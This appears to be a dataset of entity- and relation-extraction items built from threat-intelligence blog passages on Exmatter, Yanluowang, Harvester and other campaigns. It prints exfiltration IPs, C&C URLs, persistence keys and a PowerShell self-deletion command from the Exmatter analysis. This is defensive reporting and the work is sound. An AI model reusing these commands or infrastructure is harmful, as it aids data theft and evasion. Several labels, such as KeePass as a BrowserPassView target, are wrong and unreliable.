{"instruction": "BrowserPassView: A tool that can dump passwords from Internet Explorer and a number of other browsers Along with these tools, the attackers also use a number of open-source tools such as KeeThief, a PowerShell script to copy the master key from KeePass. In some cases, customized versions of open-source credential-dumping tools were also observed (secretsdump.exe). Credentials were also dumped from the registry. In addition, the attackers have also used a number of other data capture tools, including a screen capture tool and a file exfiltration tool (filegrab.exe). Cobalt Strike Beacon was also deployed against at least one targeted organization. Other tools used include ProxifierPE, which can be used to proxy connections back to attacker-controlled infrastructure, and the free, Chromium-based Cent web browser.", "input": null, "output": "Named Entities: (BrowserPassView, tool), (Internet Explorer, tool), (KeeThief, tool), (PowerShell script, tool), (KeePass, tool), (secretsdump.exe, file), (registry, tool), (screen capture tool, tool), (file exfiltration tool, tool), (filegrab.exe, file), (Cobalt Strike Beacon, tool), (ProxifierPE, tool), (Cent web browser, tool)\nRelationships: (BrowserPassView, dump passwords from, Internet Explorer), (BrowserPassView, dump passwords from, KeePass), (KeeThief, copy master key from, KeePass), (secretsdump.exe, dump credentials from, registry), (ProxifierPE, proxy connections to, attacker-controlled infrastructure), (Cent web browser, used by, attackers)"}
{"instruction": "The Thieflock connection \nThere is a tentative link between these Yanluowang attacks and older attacks involving Thieflock, ransomware-as-a-service developed by the Canthroid (aka Fivehands) group. Several TTPs used by these attackers overlap with TTPs used in Thieflock attacks, including: \nUse of custom password recovery tools such as GrabFF and other open-source password dumping tools \nUse of open-source network scanning tools (SoftPerfect Network Scanner) \nUse of free browsers, such as s3browser and Cent browser \nThis link begs the question of whether Yanluowang was developed by Canthroid. However, analysis of Yanluowang and Thieflock does not provide any evidence of shared authorship. Instead, the most likely hypothesis is that these Yanluowang attacks may be carried out by a former Thieflock affiliate.", "input": null, "output": "Named Entities: (Thieflock, malware), (Canthroid, attacker), (Fivehands, attacker), (Yanluowang, malware), (GrabFF, tool), (SoftPerfect Network Scanner, tool), (s3browser, tool), (Cent browser, tool)\nRelationships: (Yanluowang, link, Thieflock), (Canthroid, develop, Thieflock), (Fivehands, develop, Thieflock), (Thieflock, use, GrabFF), (Thieflock, use, SoftPerfect Network Scanner), (Thieflock, use, s3browser), (Thieflock, use, Cent browser)"}
{"instruction": "BlackMatter: New Data Exfiltration Tool Used in Attacks", "input": null, "output": "Named Entities: (BlackMatter, malware), (Data Exfiltration Tool, tool)\nRelationships: No related relations."}
{"instruction": "Development of custom tool suggests ransomware attackers are attempting to increase the speed of their attacks. \nAt least one affiliate of the BlackMatter ransomware operation has begun using a custom data exfiltration tool in its attacks. Exmatter, which was discovered by Symantec\u2019s Threat Hunter Team, is designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim\u2019s network. \nThis is the third time a custom data exfiltration tool appears to have been developed by ransomware operators, following the earlier discovery of the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware operation.", "input": null, "output": "Named Entities: (BlackMatter, attacker), (Exmatter, tool), (Ryuk Stealer, tool), (StealBit, tool)\nRelationships: (BlackMatter, use, Exmatter), (BlackMatter, linked to, StealBit)"}
{"instruction": "Exmatter in action Exmatter is compiled as a .NET executable and obfuscated. When run, it checks its command line arguments for the following strings: \"nownd\" and \"-nownd\". If either is found, it attempts to hide its own window by calling the \"ShowWindow\" API as follows: ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0); In order to identify files for exfiltration, it will retrieve the drive names of all logical drives on the infected computer and collect all file path names, disregarding anything under the following directories: C:\\Documents and Settings C:\\PerfLogs C:\\Program Files\\Windows Defender Advanced Threat Protection\\Classification\\Configuration C:\\Program Files\\WindowsApps C:\\ProgramData\\Application Data C:\\ProgramData\\Desktop C:\\ProgramData\\Documents C:\\ProgramData\\Microsoft C:\\ProgramData\\Packages C:\\ProgramData\\Start Menu C:\\ProgramData\\Templates C:\\ProgramData\\WindowsHolographicDevices C:\\Recovery C:\\System Volume Information C:\\Users\\All Users C:\\Users\\Default C:\\Users\\Public\\Documents C:\\Windows It will also exclude files of less than 1,024 bytes in size and files with the following attributes: FileAttributes.System FileAttributes.Temporary FileAttributes.Directory It will only exfiltrate files with the following extensions: .doc .docx .xls .xlsx .pdf .msg .png .ppt .pptx", "input": null, "output": "Named Entities: (Exmatter, malware)\nRelationships: No related relations."}
{"instruction": ".sda .sdm .sdw .csv It attempts to prioritize files for exfiltration by using LastWriteTime. Files that match the criteria are then uploaded to a remote SFTP server using the following parameters: Host: 165.22.84.147 Port: 22 Exmatter also includes SOCKS5 configuration, but this is not used: Host: 10.26.16.181 Port: 1080 When it has finished exfiltrating data, Exmatter starts the following process to remove any trace of itself: Filename: \"powershell.exe\" Arguments: -WindowStyle Hidden -C $path = '[FILEPATH_OF_THE_EXECUTING_SAMPLE]';Get-Process | Where-Object {$_.Path -like $path} | Stop-Process -Force;[byte[]]$arr = new-object byte[] 65536;Set-Content -Path $path -Value $arr;Remove-Item -Path $path; This will attempt to overwrite an initial chunk of the file before deleting it.", "input": null, "output": "Named Entities: (SFTP server, tool), (165.22.84.147, IP), (Exmatter, malware), (10.26.16.181, IP), (powershell.exe, file)\nRelationships: (Exmatter, upload to, SFTP server), (SFTP server, IP, 165.22.84.147), (Exmatter, start, powershell.exe)"}
{"instruction": "Newer variants Multiple variants of Exmatter have been found, suggesting that the attackers have continued to refine the tool in order to expedite exfiltration of a sufficient volume of high value data in as short a time as possible. In a second variant, the directory \u201cC:\\Program Files\\Windows Defender Advanced Threat Protection\\Classification\\Configuration\u201d has been replaced with \u201cC:\\Program Files\\Windows Defender Advanced Threat Protection\" on the exclusion list. The file types \u201c.xlsm\u201d, and \u201c.zip\u201d were added to the inclusion list. A third version of note added a WebDav client. The code structure suggests that SFTP remains the first choice protocol, with WebDav acting as a backup. The WebDav client uses the following URL: https://157.230.28.192/data/ The following file types were also added to the inclusion list: .json .config .ts .cs .js .aspx .pst In addition to this, Exmatter is configured to skip exfiltration for files with names containing any of the following strings: OneDriveMedTile", "input": null, "output": "Named Entities: (Exmatter, malware), (C&C server, tool), (WebDav client, tool), (https://157.230.28.192/data/, URL)\nRelationships: (Exmatter, refine, tool), (Exmatter, add, WebDav client), (WebDav client, URL, https://157.230.28.192/data/)"}
{"instruction": "Veteran ransomware operators BlackMatter is linked to the Coreid cyber crime group, which was previously responsible for the Darkside ransomware. For the past 12 months, it has been one of the most prolific targeted ransomware operators and its tools have been used in a number of ambitious attacks, most notably the May 2021 Darkside attack on Colonial Pipeline that disrupted fuel supplies to the East Coast of the U.S.", "input": null, "output": "Named Entities: (BlackMatter, attacker), (Coreid, attacker)\nRelationships: (BlackMatter, linked to, Coreid), (BlackMatter, used in, Darkside attack on Colonial Pipeline)"}
{"instruction": "Coreid operates under a RaaS model, working with affiliates to conduct ransomware attacks and then taking a share of the profits. Like most ransomware actors, attacks linked to Coreid steal victims\u2019 data and the group then threatens to publish it to further pressure victims into paying the ransom demand. Whether Exmatter is the creation of Coreid itself or one of its affiliates remains to be seen, but its development suggests that data theft and extortion continues to be a core focus of the group.", "input": null, "output": "Named Entities: (Coreid, attacker), (Exmatter, malware), (ransomware attacks, threat type)\nRelationships: (Coreid, conduct, ransomware attacks), (Exmatter, creation of, Coreid)"}
{"instruction": "Almost 100 Organizations in Brazil Targeted with Banking Trojan", "input": null, "output": "Named Entities: (Banking Trojan, threat type)\nRelationships: No related relations."}
{"instruction": "Recent campaign shows that this kind of activity is an ongoing threat for organizations and individuals in Latin America. Up to 100 organizations in Brazil have been targeted with a banking Trojan since approximately late August 2021, with the most recent activity seen in early October. This campaign appears to be a continuation of activity that was published about by researchers at ESET in 2020 . The attackers appeared to be undeterred by exposure and Symantec, a division of Broadcom Software, has found a large number of new indicators of compromise (IOCs) relating to this latest wave of attacks.", "input": null, "output": "Named Entities: (banking Trojan, threat type)\nRelationships: No related relations."}
{"instruction": "Symantec\u2019s Threat Hunter Team first became aware of this recent campaign when suspicious activity was spotted in a customer environment on September 30, 2021. This initial suspicious activity was detected by our Cloud Analytics technology, and further investigation found that attempts were being made to download a suspicious file named mpr.dll onto the customer\u2019s environment. Msiexec.exe was attempting to download the file from a suspicious URL. Further analysis indicated that five files were downloaded, four of which were signed and appeared to be legitimate DLL files, but the file named mpr.dll was not signed and was suspiciously large for a single DLL file at 588 MB. Symantec researchers concluded that this was a \u201cLatin American banking Trojan\u201d, due to the similar characteristics and file names seen in this campaign and in the research into Latin American banking Trojans published by ESET in 2020.", "input": null, "output": "Named Entities: (Cloud Analytics, tool), (mpr.dll, file), (Msiexec.exe, file), (Latin American banking Trojan, threat type)\nRelationships: (Msiexec.exe, attempting to download, mpr.dll), (campaign, similar characteristics and file names, Latin American banking Trojan)"}
{"instruction": "Further investigation by our analysts revealed similar activity had been aimed at multiple different organizations since late August 2021. In fact, as many as 98 organizations may have been targeted with similar activity, with all affected organizations based in Brazil. The sectors targeted with this activity included information technology, professional services, manufacturing, financial services, and government.", "input": null, "output": "No related entities and relations."}
{"instruction": "What is a \u201cLatin American banking Trojan\u201d? Banking Trojans are a type of malware designed to steal victims\u2019 online banking information so malicious actors can access victims\u2019 bank accounts. Once on a machine, the malware typically works by monitoring the websites victims are visiting and comparing these to a hardcoded list. If the victim visits a banking website the Trojan will generally display a spoofed login page in a pop-up over the legitimate page in an attempt to harvest victims\u2019 banking credentials. These pop-ups are generally made to imitate the specific banks\u2019 legitimate login pages and are often quite convincing. While once one of the biggest threats on the cyber-crime landscape, banking Trojans have been usurped in many parts of the world by ransomware in recent times. However, in Latin America particularly they still dominate a lot of cyber-crime activity.", "input": null, "output": "Named Entities: (Latin American banking Trojan, threat type), (banking Trojans, threat type), (malicious actors, attacker)\nRelationships: No related relations."}
{"instruction": "In its 2020 report, ESET determined that there were 11 banking Trojan gangs operating in Latin America, and that these groups cooperated with each other. It came to this conclusion due to the many shared tactics, tools, and procedures used by the cyber criminals deploying banking Trojans in Latin America.", "input": null, "output": "Named Entities: (banking Trojan gangs, threat type)\nRelationships: No related relations."}
{"instruction": "Stay alert for this activity The various steps taken by the attackers behind this activity to evade detection - such as using a large file for the payload so that it won\u2019t be scanned by security software, and leveraging legitimate processes and applications for malicious purposes - show that those behind this attack campaign are reasonably sophisticated actors. The number of organizations affected in this campaign also indicates that a large number of people are likely responsible for this activity - and it may be that more than one group is behind this activity. It could be a number of groups acting in a cooperative manner, as ESET said may be the approach taken by the various banking Trojan attack groups operating in Latin America.", "input": null, "output": "Named Entities: (security software, tool), (banking Trojan attack groups, attacker)\nRelationships: No related relations."}
{"instruction": "While ransomware dominates much of the discussion on the cyber-crime landscape at the moment, it is important to remember it is not the only threat out there. Banking Trojans have the potential to be a costly problem for individuals and organizations, so people, especially those based in Latin America where this activity appears to be particularly prevalent, need to remain alert to this threat. Simple steps, like ensuring you have multi-factor authentication enabled on all financial accounts, can help lessen the impact of threats like these.", "input": null, "output": "Named Entities: (ransomware, threat type), (Banking Trojans, threat type)\nRelationships: No related relations."}
{"instruction": "New Espionage Campaign Targets South East Asia", "input": null, "output": "No related entities and relations."}
{"instruction": "Unknown attacker using previously undocumented toolset targets defense, healthcare, and ICT sectors. \nAn espionage campaign using a previously undocumented toolset has targeted a range of organizations in South East Asia. Among the identified targets are organizations in the defense, healthcare, and information and communications technology (ICT) sectors. The campaign appears to have begun in September 2020 and ran at least until May 2021. \nThe toolset used by the attackers includes loaders, a modular backdoor, a keylogger, and an exfiltration tool designed to abuse cloud storage service Dropbox.", "input": null, "output": "Named Entities: (Unknown attacker, attacker), (toolset, tool), (loaders, tool), (modular backdoor, tool), (keylogger, tool), (exfiltration tool, tool), (Dropbox, tool)\nRelationships: (Unknown attacker, use, toolset), (toolset, include, loaders), (toolset, include, modular backdoor), (toolset, include, keylogger), (toolset, include, exfiltration tool), (exfiltration tool, abuse, Dropbox)"}
{"instruction": "Attacker toolbox The initial infection vector employed by the attackers remains unknown. The earliest sign of attempted compromise is a loader that decrypts and loads a payload from a .dat file. At least two different file names have been observed for the .dat file: sdc-integrity.dat and scs-integrity.dat. The loader also calls the DumpAnalyze export from the decrypted payload. The payload has yet to be identified but is almost certainly a modular backdoor. This can be inferred from one of the modules identified. This \"Orchestrator\" module points to the existence of a separate DLL module that exposes at least 16 functions, as well as the existence of a custom binary command and control (C&C) protocol used by Orchestrator but implemented separately.", "input": null, "output": "Named Entities: (loader, tool), (sdc-integrity.dat, file), (scs-integrity.dat, file), (Orchestrator module, tool)\nRelationships: (loader, load, sdc-integrity.dat), (loader, load, scs-integrity.dat), (attacker, use, loader), ((attacker, use, Orchestrator module)"}
{"instruction": "This module appears to be a core component of the backdoor. It runs as a Windows service and a large part of its functionality is implemented in a separate DLL that is loaded from registry (located in HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\<value_name_resolved_at_runtime>). The module is expected to export the following functions: Construct ConnectHost1 ForceCloseSocket Accept Recv RecvEx Send SendEx BindShell TransmitData_htran KillChildenProcessTree (sic) ExtractIPToConnect ExtractIPToConnect1 GetDeviceInfoString1 GetPseudoSocketInfo Decrypt_ByteToByte The module loads a configuration either from a file (CSIDL_COMMON_APPDATA\\Microsoft\\Crypto\\RSA\\Keys.dat) or from the registry (HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\CONFIG). The configuration is encrypted. The module uses the function Decrypt_ByteToByte from the separate DLL to decrypt the configuration. The configuration is expected to contain the following options (stored in XML format): FLAG Ip Dns CntPort LstPort Blog DropboxBlog SvcName SvcDisp SvcDesc SvcDll OlPass OlTime SelfDestroy The module also uses the hardcoded mutex name, Global\\QVomit4.", "input": null, "output": "Named Entities: (CSIDL_COMMON_APPDATA\\Microsoft\\Crypto\\RSA\\Keys.dat, file)\nRelationships: No related entities and relations."}
{"instruction": "Other tools used in the campaign include a keylogger, which shows signs of being authored by the same developer, sharing unique strings with other tools and string obfuscation techniques. The attackers also used 7zr, a legitimate tool that is a lightweight version of the 7-Zip archiver, in addition to a data-exfiltration tool that sends stolen data to Dropbox.", "input": null, "output": "Named Entities: (keylogger, tool), (7zr, tool), (7-Zip archiver, tool), (data-exfiltration tool, tool), (Dropbox, tool)\nRelationships: (keylogger, used in, campaign), (7zr, used in, campaign), (7zr, version of, 7-Zip archiver), (data-exfiltration tool, send data to, Dropbox)"}
{"instruction": "Possible false flags \nThe nature of the targets and the tools used have all the hallmarks of an espionage operation. Symantec has yet to attribute the attacks to a known actor and it appears that the attackers took some steps to complicate attribution. For example, it is not clear what language the group speaks and samples of the backdoor module found contained strings in what appeared to be both Cyrillic and Urdu scripts. \nThe only potential clue found to date is that one of the organizations attacked was also targeted by a tool used by the China-linked Leafhopper group (aka APT30) during the same time period. However, there is no evidence as yet to tie the tool to this campaign.", "input": null, "output": "Named Entities: (espionage operation, threat type), (Leafhopper group, attacker), (APT30, attacker)\nRelationships: (Leafhopper group, aka, APT30)"}
{"instruction": "Harvester: Nation-State-Backed Group Uses New Toolset to Target Victims in South Asia", "input": null, "output": "Named Entities: (Harvester, attacker)\nRelationships: No related relations."}
{"instruction": "Previously unseen attack group targets victims in the IT, telecoms, and government sectors in espionage campaign. \nA previously unseen actor, likely nation-state-backed, is targeting organizations in South Asia, with a focus on Afghanistan, in what appears to be an information-stealing campaign using a new toolset. \nThe Harvester group uses both custom malware and publicly available tools in its attacks, which began in June 2021, with the most recent activity seen in October 2021. Sectors targeted include telecommunications, government, and information technology (IT). The capabilities of the tools, their custom development, and the victims targeted, all suggest that Harvester is a nation-state-backed actor.", "input": null, "output": "Named Entities: (Harvester, attacker), (custom malware, malware)\nRelationships: (Harvester, use, custom malware)"}
{"instruction": "New toolset deployed The most notable thing about this campaign is the previously unseen toolset deployed by the attackers. The attackers deployed a custom backdoor called Backdoor.Graphon on victim machines alongside other downloaders and screenshot tools that provided the attackers with remote access and allowed them to spy on user activities and exfiltrate information. We do not know the initial infection vector that Harvester used to compromise victim networks, but the first evidence we found of Harvester activity on victim machines was a malicious URL. The group then started to deploy various tools, including its custom Graphon backdoor, to gain remote access to the network. The group also tried to blend its activity in with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure for its command and control (C&C) activity. Tools used: Backdoor.Graphon - custom backdoor that uses Microsoft infrastructure for its C&C activity", "input": null, "output": "Named Entities: (toolset, tool), (Backdoor.Graphon, malware), (Harvester, attacker), (CloudFront, tool), (Microsoft infrastructure, tool)\nRelationships: (Harvester, use, Backdoor.Graphon), (Backdoor.Graphon, use, Microsoft infrastructure), (Harvester, deploy, toolset), (Harvester, leverage, CloudFront), (Harvester, leverage, Microsoft infrastructure)"}
{"instruction": "Custom Downloader - uses Microsoft infrastructure for its C&C activity Custom Screenshotter - periodically logs screenshots to a file Cobalt Strike Beacon - uses CloudFront infrastructure for its C&C activity (Cobalt Strike is an off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files) Metasploit - an off-the-shelf modular framework that can be used for a variety of malicious purposes on victim machines, including privilege escalation, screen capture, to set up a persistent backdoor, and more. The custom downloader used by the attackers leverages the Costura Assembly Loader. Once on a victim machine, it checks if the following file exists: [ARTEFACTS_FOLDER]\\winser.dll If the file does not exist it downloads a copy from the following URL: hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210 Next, the sample creates the following file if it does not exist: \"[ARTEFACTS_FOLDER]\\Microsoft Services[.]vbs\"", "input": null, "output": "Named Entities: (Custom Downloader, tool), (Custom Screenshotter, tool), (Cobalt Strike Beacon, tool), (Metasploit, tool), (Costura Assembly Loader, tool), ([ARTEFACTS_FOLDER]\\winser.dll, file), (hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210, URL)\nRelationships: (Custom Downloader, leverage, Costura Assembly Loader), (Custom Downloader, download, hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210), (Custom Downloader, check, [ARTEFACTS_FOLDER]\\winser.dll)"}
{"instruction": "Then it sets the following registry value to create a loadpoint: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"MicrosoftSystemServices\" = \"[ARTEFACTS_FOLDER]\\Microsoft Services[.]vbs\" Finally it opens an embedded web browser within its own UI using the following URL: hxxps://usedust[.]com While it initially appeared that this URL may have been a loadpoint for Backdoor.Graphon, upon further investigation it appears to be a decoy to confuse any affected users. Backdoor.Graphon is compiled as a .NET PE DLL with export \u201cMain\u201d and the following PDB file name: D:\\OfficeProjects\\Updated Working Due to Submission\\4.5\\Outlook_4.5\\Outlook 4.5.2 32 bit New without presistancy\\NPServices\\bin\\x86\\Debug\\NPServices[.]pdb When this is executed, it attempts to communicate with the attackers\u2019 C&C servers, which are hosted on Microsoft infrastructure. hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] The attackers then run commands to control their input stream and capture the output and error streams. They also periodically send GET requests to the C&C server, with the content of any returned messages extracted and then deleted.", "input": null, "output": "Named Entities: (Backdoor.Graphon, malware), (MicrosoftSystemServices, tool), (hxxps://usedust[.]com, URL), (hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (Microsoft infrastructure, tool)\nRelationships: (Backdoor.Graphon, loadpoint, MicrosoftSystemServices), (Backdoor.Graphon, decoy, hxxps://usedust[.]com), (Backdoor.Graphon, communicate with, Microsoft infrastructure), (MicrosoftSystemServices, URL, hxxps://usedust[.]com), (Backdoor.Graphon, communicate with, hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID]), (Backdoor.Graphon, communicate with, hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID]), (Backdoor.Graphon, communicate with, hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID])"}
{"instruction": "Data that cmd.exe pulled from the output and error streams is encrypted and sent back to the attackers\u2019 servers. The custom screenshot tool was also packed with the Costura Assembly Loader. The screenshot tool takes photos that it saves to a password-protected ZIP archive for exfiltration, with all archives older than a week deleted.", "input": null, "output": "Named Entities: (cmd.exe, file), (screenshot tool, tool), (Costura Assembly Loader, tool)\nRelationships: (cmd.exe, pull, attackers' servers), (screenshot tool, packed with, Costura Assembly Loader)"}
{"instruction": "Ongoing activity \nWhile we do not have enough evidence yet to attribute Harvester\u2019s activity to a specific nation state, the group\u2019s use of custom backdoors, the extensive steps taken to hide its malicious activity, and its targeting all point to it being a state-sponsored actor. Harvester\u2019s use of legitimate infrastructure to host its C&C servers in order to blend in with normal network traffic is one example of the stealthy steps taken by this actor. \nThe targeting of organizations in Afghanistan in this campaign is also interesting given the huge upheaval seen in that country recently. The activity carried out by Harvester makes it clear the purpose of this campaign is espionage, which is the typical motivation behind nation-state-backed activity. \nThat Harvester\u2019s most recent activity was seen earlier this month means that organizations in the sectors and geographies mentioned should be alert to the malicious activity outlined in this blog.", "input": null, "output": "Named Entities: (Harvester, attacker), (custom backdoors, malware), (C&C servers, tool)\nRelationships: (Harvester, use, custom backdoors), (Harvester, use, C&C servers)"}
{"instruction": "New Yanluowang Ransomware Used in Targeted Attacks", "input": null, "output": "Named Entities: (New Yanluowang Ransomware, malware)\nRelationships: No related relations."}
{"instruction": "New arrival to the targeted ransomware scene appears to be still in development. The Symantec Threat Hunter Team, a part of Broadcom Software , has uncovered what appears to be a new ransomware threat called Yanluowang that is being used in targeted attacks. In a recent attempted ransomware attack against a large organization, Symantec obtained a number of malicious files that, upon further investigation, revealed the threat to be a new, if somewhat underdeveloped, ransomware family. The Threat Hunter Team first spotted suspicious use of AdFind, a legitimate command-line Active Directory query tool, on the victim organization\u2019s network. This tool is often abused by ransomware attackers as a reconnaissance tool, as well as to equip the attackers with the resources that they need for lateral movement via Active Directory. Just days after the suspicious AdFind activity was observed on the victim organization, the attackers attempted to deploy the Yanluowang ransomware.", "input": null, "output": "Named Entities: (Yanluowang, malware),  (AdFind, tool), (ransomware, threat type)\nRelationships: (AdFind, abused by, ransomware attackers), (AdFind, reconnaissance tool, ransomware attackers), (AdFind, equip, attackers), (Yanluowang, deployed by, attackers)"}
{"instruction": "Before the ransomware is deployed on a compromised computer, a precursor tool carries out the following actions: Creates a .txt file with the number of remote machines to check in the command line Uses Windows Management Instrumentation (WMI) to get a list of processes running on the remote machines listed in the .txt file Logs all the processes and remote machine names to processes.txt Figure 1. Yanluowang stops multiple services on compromised computers The Yanluowang ransomware is then deployed and carries out the following actions: Stops all hypervisor virtual machines running on the compromised computer Ends processes listed in processes.txt, which includes SQL and back-up solution Veeam Encrypts files on the compromised computer and appends each file with the .yanluowang extension Drops a ransom note named README.txt on the compromised computer Figure 2. Yanluowang ends the SQL and Veeam processes before encryption", "input": null, "output": "Named Entities: (ransomware, threat type), (Windows Management Instrumentation (WMI), tool), (processes.txt, file), (Yanluowang, malware), (processes.txt, file), (README.txt, file)\nRelationships: (Windows Management Instrumentation (WMI), log, processes.txt), (Yanluowang, use, Windows Management Instrumentation (WMI)), (Yanluowang, drop, README.txt)"}
{"instruction": "Figure 3. Yanluowang uses the Windows API for encryption The ransom note dropped by Yanluowang warns victims not to contact law enforcement or ransomware negotiation firms. If the attackers\u2019 rules are broken the ransomware operators say they will conduct distributed denial of service (DDoS) attacks against the victim, as well as make \u201ccalls to employees and business partners.\u201d The criminals also threaten to repeat the attack \u201cin a few weeks\u201d and delete the victim\u2019s data. Figure 4. Yanluowang ransom note", "input": null, "output": "Named Entities: (Yanluowang, malware), (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "The Ransomware Threat in 2021", "input": null, "output": "No related entities and relations."}
{"instruction": "New research from Symantec finds that organizations face an unprecedented level of danger from targeted ransomware attacks as the number of adversaries multiply alongside an increased sophistication in tactics. For the last number of years, targeted ransomware has been one of the main cyber risks for businesses and other large organizations. However, as outlined in a new whitepaper from the Symantec Threat Hunter Team, a part of Broadcom Software , the past twelve months have seen ransomware attackers become more aggressive, finding more ways to increase the reach of their attacks, and becoming more ambitious by mounting a number of audacious and highly disruptive attacks.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "The attack against Colonial Pipeline in the U.S. in May 2021 caused significant disruption and prompted concerns about the nation\u2019s fuel supplies. In the same month, an attack on Ireland\u2019s national health service, the Health Service Executive, forced it to cancel thousands of appointments and initiate a recovery operation that is only now concluding. Figure 1. Number of organizations affected by targeted ransomware attacks, January 2020 to June 2021 While the overall levels of ransomware activity have fallen, this is accounted for by the decline of mass-mailing, indiscriminate ransomware attacks. Of greater concern is that the number of organizations confirmed as affected by targeted ransomware attacks increased by up by 83% over the past 18 months, from 81 in January 2020 to 148 in June 2021.", "input": null, "output": "No related entities and relations."}
{"instruction": "The real number of targeted ransomware attacks is much higher. Confirmed attacks from known targeted ransomware families are probably only a representative sample of the overall number of attacks involving these threats. Many targeted ransomware attacks are halted before payload deployment, meaning they may not be identified as ransomware. In addition, most targeted ransomware operators recompile their ransomware for every new attack. This means that the variant of the ransomware used in an attack may be blocked by generic or machine learning-generated detections rather than a detection linked to that ransomware family. Alongside this increase in activity levels, the ransomware threat landscape has become more complex and sophisticated and a number of new developments have compounded the threat for organizations.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "The rise of ransomware-as-a-service Although ransomware-as-a-service (RaaS) is not a new concept, the RaaS marketplace has evolved significantly over the past year. The basic template currently involves ransomware authors offering access to the ransomware itself, hosting for breached data, and handling of ransom negotiations. In some cases, it has been reported that ransomware developers provide an entire playbook for affiliates.", "input": null, "output": "Named Entities: (ransomware-as-a-service, threat type), (ransomware authors, attacker), (breached data, tool), (ransom negotiations, tool), (ransomware developers, attacker), (affiliates, attacker)\nRelationships: (ransomware-as-a-service, involve, ransomware authors), (ransomware-as-a-service, involve, breached data), (ransomware-as-a-service, involve, ransom negotiations), (ransomware-as-a-service, involve, ransomware developers), (ransomware-as-a-service, involve, affiliates)"}
{"instruction": "However, some ransomware affiliates now appear to be becoming less reliant on ransomware authors. While affiliates have long been known to migrate to other ransomware developers if the developer they were working with shuts down, many are now using their own distinct tools, tactics, and procedures (TTPs) regardless of the payload they are deploying. Some affiliates now appear to be simultaneously collaborating with more than one ransomware author. Symantec Threat Hunter Team has observed affiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack.", "input": null, "output": "Named Entities: (ransomware, threat type), (affiliates, attacker)\nRelationships: (affiliates, use, distinct tools)"}
{"instruction": "Botnet collaboration Over the past 12 months, secondary infections, usually via botnets, have become one of the most prevalent means of access for ransomware groups. Trojans that were once used for financial fraud, such as Trickbot, have recently been repurposed mainly as distribution channels for other malware, most notably ransomware. In some cases, ransomware attackers already control the botnets, such as the Miner group (aka Wizard Spider), which owns the Trickbot botnet. Trickbot has been seen as a precursor to attacks by Ryuk, which is also attributed to Miner. Similarly, Hispid (aka Evil Corp) have leveraged their own Dridex botnet, which was originally built to mount financial attacks, to give them a means of delivering the ransomware to organizations.", "input": null, "output": "Named Entities: (botnets, threat type), (ransomware, threat type), (Trickbot, malware), (Miner group, attacker), (Wizard Spider, attacker), (Ryuk, malware), (Hispid, attacker), (Evil Corp, attacker), (Dridex botnet, malware)\nRelationships: (botnets, means of access, ransomware groups), (Trickbot, owned by, Miner group), (Miner group, aka, Wizard Spider), (Trickbot, precursor to, Ryuk), (Hispid, leveraged, Dridex botnet), (Dridex botnet, originally built for, financial attacks), (Dridex botnet, means of delivering, ransomware)"}
{"instruction": "Other actors have since attempted to replicate this attack pattern, seeking collaborations with established botnet operators. The most notable of these is the use of IcedID by at least one affiliate operator of the Conti ransomware.", "input": null, "output": "Named Entities: (IcedID, malware), (Conti ransomware, threat type), (botnet operators, attacker)\nRelationships: (IcedID, used by, Conti ransomware), (botnet operators, collaborate with, Conti ransomware)"}
{"instruction": "Unprecedented threat \nThe profusion of groups carrying out targeted ransomware attacks combined with the evolution of the RaaS marketplace now means that targeted ransomware poses a grave threat to organizations. Although ransomware gangs have attracted significant government and law enforcement attention in recent months, multi-million dollar ransom payments mean that most threat actors remain undeterred.", "input": null, "output": "No related entities and relations."}
{"instruction": "Further Reading \nFor more information, read our whitepaper: \nSymantec Enterprise Blogs", "input": null, "output": "No related entities and relations."}
{"instruction": "The Ransomware Threat Download Ransomware Paper Now \nDownload Ransomware Paper Now", "input": null, "output": "No related entities and relations."}
{"instruction": "Pegasus Spyware Takes Flight Again", "input": null, "output": "Named Entities: (Pegasus Spyware, malware)\nRelationships: No related relations."}
